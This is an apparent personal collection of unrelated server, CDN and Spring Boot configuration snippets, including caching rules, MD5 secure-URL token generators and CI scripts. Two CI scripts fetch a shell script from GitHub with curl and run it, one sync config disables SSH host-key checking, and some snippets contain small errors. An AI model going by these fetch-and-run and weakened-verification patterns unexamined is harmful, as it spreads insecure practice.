    ExpiresByType image/png "access 1 year"
    ExpiresByType text/css "access 1 month"
    ExpiresByType text/html "access 1 month"
    ExpiresByType application/pdf "access 1 month"
    ExpiresByType text/x-javascript "access 1 month"
    ExpiresByType application/x-shockwave-flash "access 1 month"
    ExpiresByType image/x-icon "access 1 year"
    ExpiresDefault "access 1 month"
</IfModule>
## EXPIRES CACHING ##
--------------------------------------------------------------------------------------------------------
<script>
    (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function () {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
            m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
    })(window, document, 'script', 'https://cdn.yourdomain.com/local-ga.js', 'ga');

    ga('create', 'UA-xxxxxxx-x', 'auto');
    ga('send', 'pageview');
</script>
--------------------------------------------------------------------------------------------------------
function remove_querystring_var($url, $key) {
    $url = preg_replace('/(.*)(?|&)' . $key . '=[^&]+?(&)(.*)/i', '$1$2$4', $url . '&');
    $url = substr($url, 0, -1);
    return ($url);
}
--------------------------------------------------------------------------------------------------------
<filesMatch ".(ico|pdf|flv|jpg|jpeg|png|gif|js|css|swf)$">
    Header set Cache-Control "max-age=84600, public"
</filesMatch>

location ~* \.(js|css|png|jpg|jpeg|gif|ico)$ {
    expires 2d;
    add_header Cache-Control "public, no-transform";
}

header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');
--------------------------------------------------------------------------------------------------------
server {
    set $cache_uri $request_uri;

    # bypass cache if POST requests or URLs with a query string
    if ($request_method = POST) {
        set $cache_uri 'nullcache';
    }

    if ($query_string != "") {
        set $cache_uri 'nullcache';
    }

    # bypass cache if URLs containing the following strings
    if ($request_uri ~* "(/wp-admin/|/xmlrpc.php|/wp-(app|cron|login|register|mail).php|wp-.*.php|/feed/|index.php|wp-comments-popup.php|wp-links-opml.php|wp-locations.php|sitemap(index)?.xml|[a-z0-9-]+-sitemap([0-9]+)?.xml)") {
        set $cache_uri 'nullcache';
    }

    # bypass cache if the cookies containing the following strings
    if ($http_cookie ~* "comment_author|wordpress_[a-f0-9]+|wp-postpass|wordpress_logged_in") {
        set $cache_uri 'nullcache';
    }

    # custom sub directory e.g. /blog
    set $custom_subdir '';

    # default html file
    set $cache_enabler_uri '${custom_subdir}/wp-content/cache/cache-enabler/${http_host}${cache_uri}index.html';

    # webp html file
    if ($http_accept ~* "image/webp") {
        set $cache_enabler_uri '${custom_subdir}/wp-content/cache/cache-enabler/${http_host}${cache_uri}index-webp.html';
    }

    location / {
        gzip_static on; # this directive is not required but recommended
        try_files $cache_enabler_uri $uri $uri/ $custom_subdir/index.php?$args;
    }

    ...
}

# BEGIN Cache Enabler
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /

    # set blog sub path
    SetEnvIf Request_URI "^(.*)$" SUB_PATH=/wp-content/cache/cache-enabler/

    # set Cache Enabler path
    SetEnvIf Request_URI "^(.*)$" CE_PATH=$1

    <IfModule mod_mime.c>
        # webp HTML file
        RewriteCond %{ENV:CE_PATH} /$
        RewriteCond %{ENV:CE_PATH} !^/wp-admin/.*
        RewriteCond %{REQUEST_METHOD} !=POST
        RewriteCond %{QUERY_STRING} =""
        RewriteCond %{HTTP_COOKIE} !(wp-postpass|wordpress_logged_in|comment_author)_
        RewriteCond %{HTTP:Accept-Encoding} gzip
        RewriteCond %{HTTP:Accept} image/webp
        RewriteCond %{DOCUMENT_ROOT}%{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index-webp.html.gz -f
        RewriteRule ^(.*) %{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index-webp.html.gz [L]

        # gzip HTML file
        RewriteCond %{ENV:CE_PATH} /$
        RewriteCond %{ENV:CE_PATH} !^/wp-admin/.*
        RewriteCond %{REQUEST_METHOD} !=POST
        RewriteCond %{QUERY_STRING} =""
        RewriteCond %{HTTP_COOKIE} !(wp-postpass|wordpress_logged_in|comment_author)_
        RewriteCond %{HTTP:Accept-Encoding} gzip
        RewriteCond %{DOCUMENT_ROOT}%{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index.html.gz -f
        RewriteRule ^(.*) %{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index.html.gz [L]

        AddType text/html .gz
        AddEncoding gzip .gz
    </IfModule>

    # webp HTML file
    RewriteCond %{ENV:CE_PATH} /$
    RewriteCond %{ENV:CE_PATH} !^/wp-admin/.*
    RewriteCond %{REQUEST_METHOD} !=POST
    RewriteCond %{QUERY_STRING} =""
    RewriteCond %{HTTP_COOKIE} !(wp-postpass|wordpress_logged_in|comment_author)_
    RewriteCond %{HTTP:Accept} image/webp
    RewriteCond %{DOCUMENT_ROOT}%{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index-webp.html -f
    RewriteRule ^(.*) %{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index-webp.html [L]

    # default HTML file
    RewriteCond %{ENV:CE_PATH} /$
    RewriteCond %{ENV:CE_PATH} !^/wp-admin/.*
    RewriteCond %{REQUEST_METHOD} !=POST
    RewriteCond %{QUERY_STRING} =""
    RewriteCond %{HTTP_COOKIE} !(wp-postpass|wordpress_logged_in|comment_author)_
    RewriteCond %{DOCUMENT_ROOT}%{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index.html -f
    RewriteRule ^(.*) %{ENV:SUB_PATH}%{HTTP_HOST}%{ENV:CE_PATH}index.html [L]
</IfModule>
# END Cache Enabler

<filesMatch ".(ico|pdf|flv|jpg|jpeg|png|gif|js|css|swf)$">
    Header set Cache-Control "max-age=84600, public"
</filesMatch>

location ~* \.(js|css|png|jpg|jpeg|gif|ico)$ {
    expires 2d;
    add_header Cache-Control "public, no-transform";
}

header('Cache-Control: max-age=84600');
--------------------------------------------------------------------------------------------------------
sudo apt-get update
sudo apt-get install lsyncd

vi /etc/lsyncd.lua

settings {
    logfile = "/var/log/lsyncd/lsyncd.log",
    statusFile = "/var/log/lsyncd/lsyncd-status.log",
    statusInterval = 20
}

sync {
    default.rsync,
    source="full path to your directory",
    target="username_for_keyCDN@rsync.keycdn.com:YOURZONE/",
    rsync = {
        archive = false,
        acls = false,
        chmod = "D2755,F644"
        compress = true,
        links = false,
        owner = false,
        perms = false,
        verbose = true,
        rsh = "/usr/bin/ssh -p 22 -o StrictHostKeyChecking=no"
    }
}
--------------------------------------------------------------------------------------------------------
sudo apt-get install mtr
yum install mtr
pacman -S mtr
brew install mtr

mtr --report domainx.com
mtr -n --report 8.8.8.8
--------------------------------------------------------------------------------------------------------
Open the rsyslog conf file and add the following lines

vi /etc/rsyslog.conf

# provides UDP syslog reception
module(load="imudp")
Create and open your custom config file.

vi /etc/rsyslog.d/00-custom.conf
# Templates
template(name="ReceiveFormat" type="string" string="%msg:39:$%\n")

# UDP ruleset mapping
input(type="imudp" port="514" ruleset="customRuleset")

# Custom ruleset
ruleset(name="customRuleset") {
    if ($msg contains '366c3df6-93dd-4ec0-a218-aec9d191c59e') then {
        /var/log/cdn.log;ReceiveFormat
        stop
    }
}

service rsyslog restart
netstat -na | grep ":<defined port>"
tcpdump port <defined port>
tail -f /var/log/cdn.log
--------------------------------------------------------------------------------------------------------
echo QUIT | openssl s_client -connect cdn.yourdomain.com:443 -servername cdn.yourdomain.com -tls1 -tlsextdebug -status
echo -n '{path}{secret}{timestamp}' | openssl md5 -binary | openssl base64 | tr +/ -_ | tr -d =
echo -n '/path/to/file1.jpgmysecret1384719072' | openssl md5 -binary | openssl base64 | tr +/ -_ | tr -d =
--------------------------------------------------------------------------------------------------------
var crypto = require('crypto'),
    secret = 'your_secret',
    path = '/path/to/your/file.jpg';

// define expiry (e.g. 120 seconds)
var expire = Math.round(Date.now()/1000) + 120;

// generate md5 token
var md5String = crypto
    .createHash("md5")
    .update(path + secret + expire)
    .digest("binary");

// encode and format md5 token
var token = new Buffer(md5String, 'binary').toString('base64');
token = token.replace(/\+/g, '-').replace(/\//g, '_').replace(/\=/g, '');

// return secure token
console.log('http://demo-1.kxcdn.com' + path + '?token=' + token + '&expire=' + expire);
--------------------------------------------------------------------------------------------------------
spring.cloud.stream.kafka.binder.headers=bar
spring.cloud.stream.bindings.output.destination=foobar
spring.cloud.stream.bindings.input.destination=foobar
spring.cloud.stream.bindings.input.group=foo

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.cloud.stream.annotation.EnableBinding;
import org.springframework.cloud.stream.messaging.Processor;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.integration.support.MessageBuilder;
import org.springframework.messaging.Message;
import org.springframework.messaging.MessageHandler;
import org.springframework.messaging.MessagingException;

@SpringBootApplication
@EnableBinding(Processor.class)
public class So38961697Application {

    public static void main(String[] args) throws Exception {
        ConfigurableApplicationContext context = SpringApplication.run(So38961697Application.class, args);
        Foo foo = context.getBean(Foo.class);
        foo.start();
        foo.send();
        Thread.sleep(30000);
        context.close();
    }

    @Bean
    public Foo foo() {
        return new Foo();
    }

    private static class Foo {

        @Autowired
        Processor processor;

        public void send() {
            Message<?> m = MessageBuilder.withPayload("foo")
                    .setHeader("bar", "baz")
                    .build();
            processor.output().send(m);
        }

        public void start() {
            this.processor.input().subscribe(new MessageHandler() {

                @Override
                public void handleMessage(Message<?> m) throws MessagingException {
                    System.out.println(m);
                }

            });
        }

    }

}
--------------------------------------------------------------------------------------------------------
@SpringBootApplication
public class Application extends SpringBootServletInitializer {

    @Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {
        return configureApplication(builder);
    }

    public static void main(String[] args) {
        configureApplication(new SpringApplicationBuilder()).run(args);
    }

    private static SpringApplicationBuilder configureApplication(SpringApplicationBuilder builder) {
        return builder.sources(Application.class).bannerMode(Banner.Mode.OFF);
    }

}
--------------------------------------------------------------------------------------------------------
buildscript {

    ext {
        springBootVersion = '1.3.0.RELEASE'
    }

    repositories {
        maven {
            url "https://plugins.gradle.org/m2/"
        }
        mavenLocal()
        mavenCentral()
}

    dependencies {
        classpath ("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}") 
        classpath ("io.spring.gradle:dependency-management-plugin:0.5.2.RELEASE")
        classpath ("mysql:mysql-connector-java:5.1.34")
        classpath ("org.sonarqube.gradle:gradle-sonarqube-plugin:1.1")
    }
}

repositories {
        maven {
            url "https://plugins.gradle.org/m2/"
            url "https://repo.spring.io/snapshot"
            url "https://repo.spring.io/milestone"
        }
        mavenLocal()
        mavenCentral()
}


apply plugin: 'java'
apply plugin: 'eclipse-wtp'
apply plugin: 'idea'
apply plugin: 'spring-boot' 
apply plugin: 'io.spring.dependency-management' 
apply plugin: 'org.sonarqube'
apply plugin: "jacoco"
apply plugin: "sonar-runner"


group    = 'com.api'

def build_version=project.properties['build_version'] ?: "SNAPSHOT"
version  = "${build_version}"

ext.packaging = 'jar'

jar {
   baseName = "userassociations-v1"
}


sourceCompatibility = 1.8
targetCompatibility = 1.8

sourceSets {
    generated {
        java {
            srcDirs = ['src/main/generated']
        }
    }
}


configurations {
    providedRuntime
     querydslapt
}

jacoco {

    reportsDir = file("build/tmp/jacoco.exec")
}

test{
    ignoreFailures = true    
}

sonarqube {
  properties {
    property "sonar.projectName", "User-associations-V1"
    property "sonar.projectKey", "org.sonarqube:User-associations-V1"
    property "sonar.sourceEncoding", "UTF-8"
    property "sonar.host.url", "${sonar_host}"
    property "sonar.login", "${sonar_username}"
    property "sonar.password", "${sonar_password}"
    property "sonar.jacoco.reportPath", "build/jacoco/test.exec"
    property "sonar.java.source property", "1.8"

  }
}

dependencyManagement {
    imports { 
        mavenBom "org.springframework.cloud:spring-cloud-starter-parent:Brixton.RC1" 
    }
}

dependencies {
    compile         ("org.springframework.boot:spring-boot-starter-actuator")
    compile         ("org.springframework.cloud:spring-cloud-starter-eureka")
    compile         ("org.springframework.cloud:spring-cloud-config-client")
    compile("org.springframework.cloud:spring-cloud-starter-hystrix:1.0.6.RELEASE")
    compile("org.springframework.cloud:spring-cloud-starter-bus-amqp:1.0.6.RELEASE")
    compile("org.springframework.cloud:spring-cloud-netflix-hystrix-amqp:1.0.6.RELEASE")
    compile         ("org.codehaus.sonar-plugins.java:sonar-jacoco-plugin:2.3")
    compile         ("org.springframework.boot:spring-boot-starter-web")
    compile         ("org.codehaus.jackson:jackson-mapper-asl:1.9.2")
    compile         ("mysql:mysql-connector-java:5.1.34")
    compile         ("org.springframework:spring-webmvc:4.2.2.RELEASE")
    compile         ("org.springframework.boot:spring-boot-starter-data-jpa")
    providedRuntime ("org.springframework.boot:spring-boot-starter-tomcat")
    testCompile     ("org.springframework.boot:spring-boot-starter-test") 
    querydslapt     ("org.hibernate:hibernate-jpamodelgen:5.0.5.Final")
    compile 'org.springframework.cloud:spring-cloud-starter-sleuth:1.0.0.M1'
    compile 'org.springframework.cloud:spring-cloud-sleuth-core:1.0.0.M1' 
}


eclipse {
    classpath {
         containers.remove('org.eclipse.jdt.launching.JRE_CONTAINER')
         containers ('org.eclipse.jdt.launching.JRE_CONTAINER/org.eclipse.jdt.internal.debug.ui.launcher.StandardVMType/JavaSE-1.8')
    }
}

task generateQueryDSL(type: JavaCompile, group: 'build', description: 'Generates the QueryDSL query types') {
    source = sourceSets.main.java
    classpath = configurations.compile + configurations.querydslapt
    options.compilerArgs = [
            "-proc:only"
    ]
    destinationDir = sourceSets.generated.java.srcDirs.iterator().next()
}

compileJava {
    dependsOn generateQueryDSL
    source generateQueryDSL.destinationDir
}

compileGeneratedJava {
    dependsOn generateQueryDSL
    options.warnings = false
    classpath += sourceSets.main.runtimeClasspath
}

clean {
    delete sourceSets.generated.java.srcDirs
}

task wrapper(type: Wrapper) {
    gradleVersion = '2.9'
}
--------------------------------------------------------------------------------------------------------
int rand7()
{
    int vals[5][5] = {
        { 1, 2, 3, 4, 5 },
        { 6, 7, 1, 2, 3 },
        { 4, 5, 6, 7, 1 },
        { 2, 3, 4, 5, 6 },
        { 7, 0, 0, 0, 0 }
    };

    int result = 0;
    while (result == 0)
    {
        int i = rand5();
        int j = rand5();
        result = vals[i-1][j-1];
    }
    return result;
}

int i;
do
{
  i = 5 * (rand5() - 1) + rand5();  // i is now uniformly random between 1 and 25
} while(i > 21);
// i is now uniformly random between 1 and 21
return i % 7 + 1;  // result is now uniformly random between 1 and 7

public static int random_7() {
    int returnValue = 0;
    while (returnValue == 0) {
        for (int i = 1; i <= 3; i++) {
            returnValue = (returnValue << 1) + random_5_output_2();
        }
    }
    return returnValue;
}

private static int random_5_output_2() {
    while (true) {
        int flip = random_5();

        if (flip < 3) {
            return 0;
        }
        else if (flip > 3) {
            return 1;
        }
    }
}
--------------------------------------------------------------------------------------------------------
@Bean
    public TomcatServletWebServerFactory containerFactory() {
        return new TomcatServletWebServerFactory() {
            protected void customizeConnector(Connector connector) {
                int maxSize = 50000000;
                super.customizeConnector(connector);
                connector.setMaxPostSize(maxSize);
                connector.setMaxSavePostSize(maxSize);
                if (connector.getProtocolHandler() instanceof AbstractHttp11Protocol) {

                    ((AbstractHttp11Protocol <?>) connector.getProtocolHandler()).setMaxSwallowSize(maxSize);
                    logger.info("Set MaxSwallowSize "+ maxSize);
                }
            }
        };

    }
--------------------------------------------------------------------------------------------------------
   @Bean
        @ConditionalOnMissingBean(name = "redisTemplate")
        public RedisTemplate<Object, Object> redisTemplate(
                RedisConnectionFactory redisConnectionFactory)
                        throws UnknownHostException {
            RedisTemplate<Object, Object> template = new RedisTemplate<Object, Object>();
            template.setConnectionFactory(redisConnectionFactory);
            return template;
        }
--------------------------------------------------------------------------------------------------------
spring.main.allow-bean-definition-overriding=true

@LoadBalanced
--------------------------------------------------------------------------------------------------------
<dependency>
    <groupId>org.springframework.cloud</groupId>
    <artifactId>spring-cloud-sleuth-zipkin2</artifactId>
    <version>2.0.0.M4</version>
</dependency>
--------------------------------------------------------------------------------------------------------
@PreAuthorize("#username == authentication.principal.username")
@PostAuthorize("returnObject.username == authentication.principal.nickName")
public CustomUser securedLoadUserDetail(String username) {
    return userRoleRepository.loadUserByUserName(username);
}
--------------------------------------------------------------------------------------------------------
Test
@WithMockUser(username = "john", roles = { "VIEWER" })
public void givenRoleViewer_whenCallGetUsername_thenReturnUsername() {
    String userName = userRoleService.getUsername();
     
    assertEquals("john", userName);
}
--------------------------------------------------------------------------------------------------------
random.number=${random.int}
random.long=${random.long}
random.uuid=${random.uuid}
--------------------------------------------------------------------------------------------------------
package examples;

public class ExampleBean {

    // Fields omitted

    @ConstructorProperties({"years", "ultimateAnswer"})
    public ExampleBean(int years, String ultimateAnswer) {
        this.years = years;
        this.ultimateAnswer = ultimateAnswer;
    }
}
--------------------------------------------------------------------------------------------------------
@ContextConfiguration
@TestPropertySource("/my-test.properties")
public class IntegrationTests {
    // tests
}

@ContextConfiguration
@TestPropertySource("foo=bar", "bar=foo")
public class IntegrationTests {
    // tests
}

@SpringBootTest(properties = {"foo=bar", "bar=foo"})
public class IntegrationTests {
    // tests
}
--------------------------------------------------------------------------------------------------------
#!/bin/bash

set -o errexit

mkdir -p target

REPO_URL="https://github.com/spring-cloud-samples/sleuth-documentation-apps.git"
BRANCH_NAME="master"

pushd target
git clone "${REPO_URL}"

pushd sleuth-documentation-apps
./scripts/runAcceptanceTests.sh

popd
popd



#!/bin/bash

set -o errexit

mkdir -p target

SCRIPT_URL="https://raw.githubusercontent.com/spring-cloud-samples/brewery/master/runAcceptanceTests.sh"
AT_WHAT_TO_TEST="SLEUTH"
BRANCH_NAME="master"

cd target

curl "${SCRIPT_URL}" --output runAcceptanceTests.sh

chmod +x runAcceptanceTests.sh

echo "Killing all running apps"
./runAcceptanceTests.sh -t "${AT_WHAT_TO_TEST}" -n -br "${BRANCH_NAME}"

./runAcceptanceTests.sh --whattotest "${AT_WHAT_TO_TEST}" --killattheend -br "${BRANCH_NAME}"



#!/bin/bash

set -o errexit

mkdir -p target

SCRIPT_URL="https://raw.githubusercontent.com/spring-cloud-samples/brewery/master/runAcceptanceTests.sh"
AT_WHAT_TO_TEST="SLEUTH_STREAM"
BRANCH_NAME="master"

cd target

curl "${SCRIPT_URL}" --output runAcceptanceTests.sh

chmod +x runAcceptanceTests.sh

echo "Killing all running apps"
./runAcceptanceTests.sh -t "${AT_WHAT_TO_TEST}" -n -br "${BRANCH_NAME}"

./runAcceptanceTests.sh --whattotest "${AT_WHAT_TO_TEST}" --killattheend -br "${BRANCH_NAME}"


#!/bin/bash

echo "Running JMH Benchmarks"
./mvnw clean install -DskipTests --projects benchmarks --also-make -Pbenchmarks,jmh
java -Djmh.ignoreLock=true -jar benchmarks/target/benchmarks.jar org.springframework.cloud.sleuth.benchmarks.jmh.* -rf csv -rff jmh-result.csv | tee target/benchmarks.log


#!/bin/bash

echo "Killing the remaining apps - if something went wrong previously"
pkill -f SleuthBenchmarkingSpringApp || echo "No apps to kill"

echo "Running JMeter Benchmarks"
./mvnw clean verify --projects benchmarks --also-make -Pbenchmarks,jmeter
echo "Killing the remaining apps - if something went wrong after the tests"
pkill -f SleuthBenchmarkingSpringApp || echo "No apps to kill"
--------------------------------------------------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE suppressions PUBLIC
	"-//Puppy Crawl//DTD Suppressions 1.1//EN"
	"https://www.puppycrawl.com/dtds/suppressions_1_1.dtd">
<suppressions>
	<suppress files=".*/test/.*" checks="JavadocVariable"/>
	<suppress files=".*FinishedSpanHandlerTests.*" checks="LineLengthCheck"/>
	<suppress files=".*GrpcTracingIntegrationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*IgnoreAutoConfiguredSkipPatternsIntegrationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*RestTemplateTraceAspectIntegrationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*SkipEndPointsIntegrationTestsWithContextPathWithBasePath.*" checks="LineLengthCheck"/>
	<suppress files=".*SkipEndPointsIntegrationTestsWithContextPathWithoutBasePath.*" checks="LineLengthCheck"/>
	<suppress files=".*SkipEndPointsIntegrationTestsWithoutContextPathWithBasePath.*" checks="LineLengthCheck"/>
	<suppress files=".*SkipEndPointsIntegrationTestsWithoutContextPathWithoutBasePath.*" checks="LineLengthCheck"/>
	<suppress files=".*SleuthNewSpanParserAnnotationDisableTests.*" checks="LineLengthCheck"/>
	<suppress files=".*SpanAdjusterTests.*" checks="LineLengthCheck"/>
	<suppress files=".*SpringDataInstrumentationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TagPropagationFinishedSpanHandlerTest.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceAsyncIntegrationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceAutoConfigurationWithDisabledSleuthTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceFilterIntegrationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceFilterWebIntegrationMultipleFiltersTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceFilterWebIntegrationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceMessagingAutoConfiguration.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceMessagingAutoConfigurationTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceRequestHttpHeadersFilter.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceWebAutoConfiguration.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceWebClientBeanPostProcessor.*" checks="LineLengthCheck"/>
	<suppress files=".*TracingFeignClient.*" checks="LineLengthCheck"/>
	<suppress files=".*WebClientTests.*" checks="LineLengthCheck"/>
	<suppress files=".*TraceReactorAutoConfigurationAccessorConfiguration.*" checks="LineLengthCheck"/>
	<suppress files=".*SamplerAutoConfiguration.*" checks="HideUtilityClassConstructorCheck"/>
	<suppress files=".*TraceReactorAutoConfiguration.*" checks="HideUtilityClassConstructorCheck"/>
	<suppress files=".*grpc.stubs.*" checks=".*"/>
</suppressions>
--------------------------------------------------------------------------------------------------------
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-sleuth</artifactId>
            <version>${spring-cloud-sleuth.version}</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
<dependencies>
    <dependency>
        <groupId>org.springframework.cloud</groupId>
        <artifactId>spring-cloud-starter-sleuth</artifactId>
    </dependency>
</dependencies>
--------------------------------------------------------------------------------------------------------
dist: trusty
sudo: required
language: java

addons:
  sonarcloud:
    organization: "cristinanegrean-github"
    token:
      secure: "6r3ebBo7DU9F1pInqogy4crDOWO9pAJHkVBugWTq89gfzaDJT+o/Sut7lwLkPEQqd8dPf/N5mkOKxPaK0cjtyJq55ZFPDeOkWeEnyg6ljlHlcafP4Qt2IjdCgeTcbl+UxIDP1QXQa/g9pnLNn2CynY1AiFqL1VoTDgE6GbIn8byfg7xvJRyyLJHKVSK0Ohs/cwlLy28YjIq09rTp2CP/axZhKoq5UQgkPKiUycULAEzZ2bl/52b4WuKajHelyJ7GzPhlTxTyYpLQPmk2ruuYPg0R0MFZUcFo9G+E2XHzEOftwjiH1zAkhCW0mcCz6BALsZmIo38eK+oQipicO35gHh4p7sd9JQU+0kjltvZSryQYtjXiGzqsC8NRh7LP8eU+HX3OoFeVIUwtyZvAkoZFUjKdjikvLqjVjPF4aC3IO56tgeFcZ1Aaom2g0smJphtA0V62XOW+p+ConIUOjQCfLWB1TxnS3MD9uNJoCIvBqkluMjTseJVbAylRWAN6ZLIuhpPJvSj4HuiL2Zcu/HNn7X/XrQW44VqcvJXTJ43PXN4D/3GH0nQ6WTkOFcfEBOGJmiaHt/rvnn1TKJerqrKvvA9Yp4CUDTZoDpicKk1miB6gSAE6l5E4if7OIPJKCRVELzQJsEhXv6TW46PhLiF6gmeTbNw9G6s6ZczxjZXjF9M="

jdk: oraclejdk8
services:
  - docker

script:
  - ./gradlew clean build docker coveralls sonarqube
--------------------------------------------------------------------------------------------------------
require 'digest/md5'
require 'base64'

secret = 'your_secret'
path = '/path/to/your/file.jpg'

# expiry time in seconds (e.g. 3600 seconds)
expire = Time.now.to_i + 3600
token = Base64.encode64(
    Digest::MD5.digest(
        "#{path}#{secret}#{expire}"
    )
).gsub("\n", "").gsub("+", "-").gsub("/", "_").gsub("=", "")

# final secured URL
url = "http://demo-1.kxcdn.com#{path}?token=#{token}&expire=#{expire}"

puts url
--------------------------------------------------------------------------------------------------------
import base64
from hashlib import md5
from time import time

secret = 'your_secret'
path = "/path/to/file1.jpg"

# expiration in seconds (e.g. 180 seconds)
expire = int(time()) + 180

# generate token
token = base64.encodestring(
    md5(
        "%s%s%s" % (path, secret, expire)
    ).digest()
).replace("\n", "").replace("+", "-").replace("/", "_").replace("=", "")
secured_url = "http://demo-1.kxcdn.com%s?token=%s&expire=%s" % (path, token, expire)

# return secured URL
print secured_url
--------------------------------------------------------------------------------------------------------
<?php
    $secret = 'securetokenkey';
    $path = '/path/to/file1.jpg';

    // Expiration in seconds (e.g. 90 seconds)
    $expire = time() + 90;

    // Generate token
    $md5 = md5($path.$secret.$expire, true);

    $md5 = base64_encode($md5);
    $md5 = strtr($md5, '+/', '-_');
    $md5 = str_replace('=', '', $md5);

    // Use this URL
    $url = "http://yourzone-id.kxcdn.com{$path}?token={$md5}&expire={$expire}";

    echo $url;
?>
--------------------------------------------------------------------------------------------------------
kafka-topics.sh --zookeeper <host,host,host> --topic flume-channel --partitions 1 --replication-factor 2 --create
kafka-console-consumer.sh --bootstrap-server <host,host,host> --topic flume-channel --group flume-channel-consumers --from-beginning
--------------------------------------------------------------------------------------------------------
docker run -p "25:25" -p "143:143" linagora/james-jpa-sample:3.3.0
--------------------------------------------------------------------------------------------------------
DISM /Online /Cleanup-Image /RestoreHealth
Get-AppxPackage -AllUsers| Foreach {Add-AppxPackage -DisableDevelopmentMode -Register “$($_.InstallLocation)\AppXManifest.xml”}
--------------------------------------------------------------------------------------------------------
cmd.exe /k echo WELCOME
--------------------------------------------------------------------------------------------------------git clone https://github.com/armdev/springboot2-swagger.git
cd springboot2-swagger.git
mvn spring-boot:run -P update-sourcepath-for-lombok
firefox localhost:4545/swagger-ui.html
--------------------------------------------------------------------------------------------------------
#!/bin/bash

# ======================================
# ANSI
# ======================================
ansi_reset='\e[0m'

blue='\e[34m'

yellow_b='\e[1;33m'

red_b='\e[1;31m'


# ======================================
# Constants
# ======================================
svg_source="icons.svg"

svg_src_tmp="/tmp/icons.svg"

default_color="#4078c0"

default_size=32

icon_index="index.txt"


# ======================================
# User Input
# ======================================
echo "Enter icon size (skip for default icon dimensions): "
read -r icon_size

echo "Enter 1 or more colors (space or tab separated): "
read -r -a icon_color


# ======================================
# Checks
# ======================================
# If no colors given, add default color to array
[ ${#icon_color[*]} -eq 0 ] && icon_color[0]=$default_color

icon_size=${icon_size:-"$default_size"}


# ======================================
# RENDER
# ======================================
for color in ${icon_color[*]}; do

    mkdir -p "${color}__$icon_size"


    trap 'rm $svg_src_tmp; exit' INT TERM


    cp "$svg_source" "$svg_src_tmp"


    # Change color of temp copy
    [ ! "$color" = "$default_color" ] &&
    sed -i "s/$default_color/$color/" "$svg_src_tmp"


    # Loop through index.txt & render png's
    while read -r i; do

        if [ -f "${color}__$icon_size/$i.png" ]; then
            echo -e "${red_b}${color}__$icon_size/$i.png exists.${ansi_reset}"

        else
            echo
            echo -e "${blue}Rendering ${yellow_b}${color}__$icon_size/$i.png${ansi_reset}"
            inkscape --export-id="${i}" \
                     --export-id-only \
                     --export-width="$icon_size" --export-height="$icon_size" \
                     --export-png="${color}__$icon_size/$i.png" "$svg_src_tmp" >/dev/null
        fi
    done < "$icon_index"


    # Remove copy before next iteration or EXIT
    rm "$svg_src_tmp"

done


# If notify-send installed, send notif
hash notify-send 2>/dev/null &&
notify-send -i 'terminal' \
            -a 'Terminal' \
            'Terminal'    \
            'Finished rendering icons!'
--------------------------------------------------------------------------------------------------------
sudo apt install oracle-java11-set-default
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
